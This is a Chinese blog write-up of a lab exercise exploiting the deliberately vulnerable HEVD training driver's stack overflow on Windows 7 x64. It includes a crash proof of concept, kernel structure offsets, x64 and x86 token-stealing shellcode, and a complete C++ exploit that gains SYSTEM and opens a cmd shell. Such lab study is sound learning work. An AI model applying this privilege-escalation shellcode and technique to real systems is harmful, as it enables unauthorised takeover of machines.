---
title: 'HEVD win7 x64 stack overflow'
date: 2022-06-25 11:01:26
category: Learning
tags: [windows kernel]
published: true
hideInList: false
feature: 
isTop: false
---

尝试学点新东西，应该算是很久没学了

```
环境：
虚拟机：Win7 SP1 x64
物理机：Win10
debugger：windbg preview
compiler：vs2022
```

## 环境搭建

### VirtualKD-Redux

看了很多博客，以及尝试搭建环境，最后发现还是别人写的轮子好用

[VirtualKD-Redux](https://github.com/4d61726b/VirtualKD-Redux)

下载之后，解压，把`target64`文件夹放到虚拟机中，然后在虚拟机运行`vminstall.exe`即可

这个安装所做的事情，如[VirtualKD加速windbg双机调试速度](https://blog.csdn.net/lixiangminghate/article/details/78659646)所说

第一件事情就是添加了一个`VirtualKD`的启动项

但是第二件事情，我并没找到存在`DDKLaunchMonitor.exe`文件以及对注册表修改的行为（这个注册表的行为，可以看到老版本的这个轮子，存在`kdpatch.reg`），但是我发现`kdbazis.dll`该文件被放到了`C:\Windows\System32`目录下，查阅了一些资料，提到`kdbazis.dll`是由`kdvm.dll`重命名而来（重命名是因为避免`win8`以上的操作系统文件名称冲突），其作用就是用于通信，根据运行在主机运行`vmmon64.exe`的窗口的`log`可以看到`VirtualKD-Redux patcher DLL successfully loaded. Patching the GuestRPC mechanism...`，那应该就是对于`GuestRPC`的机制进行`patch`，从而便于通信，并且该模式下，可以加载未签名的驱动，即将要加载的`HEVD.sys`

主机在`win7`启动时，运行`vmmon64`进行监控，并启动`Run debugger`

### OSRLOADER

加载`HEVD.sys`驱动

### Windbg Preview

需要设置一下`_NT_SYMBOL_PATH`，为`srv*H:\WinSymbols*https://msdl.microsoft.com/download/symbols;`

在调试时，可以加载`HEVD.pdb`便于下断点，以及需要在`OSRLOADER`中`start service`才可以看到`HEVD`驱动

利用`lm m h*`指令就可以看到`HEVD`是否加载了

## 漏洞

可以通过`lm m HEVD`看`HEVD`模块的基础信息，通过`!drvobj HEVD 2`查看该驱动的详细的信息

在`IrpDeviceIoCtlHandler()`接口可以看到各种`ioctlhandler`，其中栈溢出为`0x222003`

```cpp
case 0x222003:
    DbgPrintEx(0x4Du, 3u, "****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
    FakeObjectNonPagedPoolNxIoctlHandler = BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);
    v7 = "****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n";
    goto LABEL_62;
```

漏洞点十分简单，就是裸溢出

```cpp
__int64 __fastcall BufferOverflowStackIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
{
  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; // rcx
  __int64 result; // rax
  unsigned __int64 Options; // rdx

  Parameters = IrpSp->Parameters.CreatePipe.Parameters;
  result = 0xC0000001i64;
  Options = IrpSp->Parameters.Create.Options;
  if ( Parameters )
    return TriggerBufferOverflowStack(Parameters, Options);
  return result;
}
```

```cpp
__int64 __fastcall TriggerBufferOverflowStack(void *UserBuffer, unsigned __int64 Size)
{
  char v5[2048]; // [rsp+20h] [rbp-818h] BYREF

  memset(v5, 0, sizeof(v5));
  ProbeForRead(UserBuffer, 0x800ui64, 1u);
  DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
  DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%X\n", Size);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", v5);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 0x800i64);
  DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack\n");
  memmove(v5, UserBuffer, Size);                // stack overflow
  return 0i64;
}
```

因此输入字符串覆盖到`ret`即可触发漏洞

## exp

### POC

```cpp
#include <stdio.h>
#include <windows.h>

int main()
{
    // open device 
    HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);

    if (dev == INVALID_HANDLE_VALUE)
    {
        printf("open failed\n");
        system("pause");

        return -1;
    }

    printf("Device Handle: 0x%p\n", dev);

    CHAR* chBuffer;
    int chBufferLen = 0x818;
    
    chBuffer = (CHAR*)malloc(chBufferLen + 0x8 + 0x8 + 0x8);
    memset(chBuffer, 0xff, chBufferLen);
    memset(chBuffer + chBufferLen, 0x41, 0x8);
    memset(chBuffer + chBufferLen + 0x8, 0x42, 0x8);
    memset(chBuffer + chBufferLen + 0x10, 0x43, 0x8);

    DWORD size_returned = 0;
    BOOL is_ok = DeviceIoControl(dev, 0x222003, chBuffer, chBufferLen + 0x18, NULL, 0, &size_returned, NULL);
    CloseHandle(dev);
    system("pause");

    return 0;
}
```

首先打开这个设备，然后于这个设备进行交互，通过调试，可以看到最后`ret`的时候，`rip`跳转到了`0x4141414141414141`

### EXP

现在要做的就是提权之后再打开一个`cmd`

目前第一个栈溢出的实验，是没开`SMEP`，因此可以直接跳转到用户态的空间执行指令，就可以直接`VirtualAlloc`一个可读可写可执行的页，从而直接执行提权的指令

这里是直接参考[[Kernel Exploitation] 2: Payloads](https://www.abatchy.com/2018/01/kernel-exploitation-2)的方法，窃取的进程级令牌

每个`windows`进程都有一个[EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm)结构体（`PEB`存在于用户空间），而这个`EPROCESS`结构包含一个`Token`字段，这个字段告诉系统该进程拥有什么权限，因此如果能找到特权进程的`Token`，将其偷过来，然后放到当前进程的`Token`上，就可以提权了

为了找到`EPROCESS`就需要依赖对下述结构体的了解

#### 数据结构

**_KPCR**

[KPCR](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kpcr.htm)代表`Kernel Processor Control Region`，内核为每一个逻辑处理器都维护一个`KPCR`

可以看到`_KPRCB`结构体在`_KPCR`的偏移为`0x180`的地方

```
0: kd> dt _KPCR Prcb
ntdll!_KPCR
   +0x180 Prcb : _KPRCB
```

**_KPRCB**

[_KPRCB](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm)代表`Kernel Processor Control Block`，为`KPCR`的最后一个字段，拥有内核在管理处理器和管理资源时需要随时访问的大部分内容

可以看到在偏移为`0x8`的地方可以拿到当前的线程，因此直接通过 `_KPCR+0x188` 就可以获取当前内核线程的结构体

```
0: kd> dt _KPRCB CurrentThread
ntdll!_KPRCB
   +0x008 CurrentThread : Ptr64 _KTHREAD
```

**_KTHREAD**

[KTHREAD](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/index.htm)是内核内部的线程结构

[KPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm)位于`_KTHREAD.ApcState.Process`之中

```
0: kd> dt _KTHREAD ApcState
ntdll!_KTHREAD
   +0x050 ApcState : _KAPC_STATE
```

**_KAPC_STATE**

[_KAPC_STATE](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kprocessor_state.htm)是一个较为简单的处理器状态集合

因此通过`_KTHREAD+0x70`可以获得`_KPROCESS`

```
0: kd> dt _KAPC_STATE Process
ntdll!_KAPC_STATE
   +0x020 Process : Ptr64 _KPROCESS
```

**_EPROCESS**

根据[_EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm)和[_KPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm)可知

`_EPROCESS`的第一项是`_KPROCESS`，因此找到`_KPROCESS`的地址，就相当于找到了`_EPROCESS`的地址，相当于`_EPROCESS`就是一个大结构体，其中的第一域就是`_KPROCESS`（P.S. `_KTHREAD`和`_ETHREAD`也是类似的）

```
0: kd> dt _EPROCESS
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x160 ProcessLock      : _EX_PUSH_LOCK
   +0x168 CreateTime       : _LARGE_INTEGER
   +0x170 ExitTime         : _LARGE_INTEGER
   +0x178 RundownProtect   : _EX_RUNDOWN_REF
   +0x180 UniqueProcessId  : Ptr64 Void
   +0x188 ActiveProcessLinks : _LIST_ENTRY
   ...
   +0x208 Token            : _EX_FAST_REF
   ...
```

因此需要覆盖的`Token`就是`0x208`偏移的域，而可以通过遍历`ActiveProcessLinks`获取`active`的进程，且已知系统进程的`PID`为`4`，因此就可以遍历`0x188`的进程链，找到`PID == 4`的进程，然后取出系统进程的`Token`，覆盖到当前进程的`Token`上

#### shellcode

因此`x64`的`shellocde`如下

```assembly
xor rax, rax                        ; Set ZERO
mov rax, [gs:rax + 188h]            ; Get nt!_KPCR.PcrbData.CurrentThread
                                    ; _KTHREAD is located at GS : [0x188]           

mov rax, [rax + 70h]                ; Get nt!_KTHREAD.ApcState.Process     
mov rcx, rax                        ; Copy current process _EPROCESS structure  
mov r11, rcx                        ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                         ; WIN 7 SP1 SYSTEM process PID = 0x4           

SearchSystemPID:
mov rax, [rax + 188h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 188h
cmp [rax + 180h], rdx               ; Get nt!_EPROCESS.UniqueProcessId 
jne SearchSystemPID

mov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov [rcx + 208h], rdx
```

备份一下`x86`的

```assembly
pushad                              ; Save registers state

; Start of Token Stealing Stub
xor eax, eax                        ; Set ZERO
mov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread
                                    ; _KTHREAD is located at FS : [0x124]

mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Process
mov ecx, eax                        ; Copy current process _EPROCESS structure
mov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub eax, 0B8h
cmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Token
mov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token
                                    ; with SYSTEM process nt!_EPROCESS.Token
```

### exp.cpp

最终`exp`如下，这里的`shellcode`我是通过`nasm`进行编译的，然后再通过`hexdump -e '16/1 "%02x" " | "' -e '16/1 "%_p" "\n"' ./1.o` 变成可见字符的`16`进制，再转换的（没找到啥比较优雅的方式

```cpp
#include <stdio.h>
#include <windows.h>

int main()
{
    // open device 
    HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);

    if (dev == INVALID_HANDLE_VALUE)
    {
        printf("open failed\n");
        system("pause");

        return -1;
    }

    printf("Device Handle: 0x%p\n", dev);

    /* nasm -f elf64 ./1.s 
    xor rax, rax                    ; Set ZERO
    mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                    ; _KTHREAD is located at GS : [0x188]

    mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process
    mov rcx, rax                    ; Copy current process _EPROCESS structure
    mov r11, rcx                    ; Store Token.RefCnt
    and r11, 7

    mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4

    SearchSystemPID:
        mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
        sub rax, 188h
        cmp [rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
        jne SearchSystemPID

    mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token
    and rdx, 0fffffffffffffff0h
    or rdx, r11
    mov [rcx + 208h], rdx
    */ 
    

    CHAR shellcode[] =
    {	
        // push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15
        "\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
        
        // change token
        "\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00"
        
        // pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;
        "\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58"

        "\x48\x83\xc4\x28"					// add rsp, 0x28
        "\xc3"								// ret
    };

    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addr == NULL)
    {
        printf("VirtualAlloc failed\n");
        system("pause");

        return -1;
    }

    RtlCopyMemory(addr, shellcode, sizeof(shellcode));

    CHAR* chBuffer;
    int chBufferLen = 0x818;
    
    chBuffer = (CHAR*)malloc(chBufferLen + 0x8 + 0x8 + 0x8);
    memset(chBuffer, 0xff, chBufferLen);
    //memset(chBuffer + chBufferLen, 0x41, 0x8);
    *(INT64*)(chBuffer + chBufferLen) = (INT64)addr;
    memset(chBuffer + chBufferLen + 0x8, 0x42, 0x8);
    memset(chBuffer + chBufferLen + 0x10, 0x43, 0x8);

    DWORD size_returned = 0;
    BOOL is_ok = DeviceIoControl(dev, 0x222003, chBuffer, chBufferLen + 0x18, NULL, 0, &size_returned, NULL);
    CloseHandle(dev);
    system("pause");

    system("start cmd");

    return 0;
}
```

需要注意的是编写`exp`，最后需要能让`ioctl`的`handler`不崩溃的返回，才可以再起`cmd`，得到一个提权之后的进程，因此要恢复`ret`到`BufferOverflowStackIoctlHandler`之后的`add rsp, 0x28; ret`指令

## 参考

> https://bbs.pediy.com/thread-270159.htm
> https://h0mbre.github.io/HEVD_Stackoverflow_64bit/
> https://www.anquanke.com/post/id/245528
> https://50u1w4y.github.io/site/HEVD/homePage/
> https://www.abatchy.com/2018/01/kernel-exploitation-2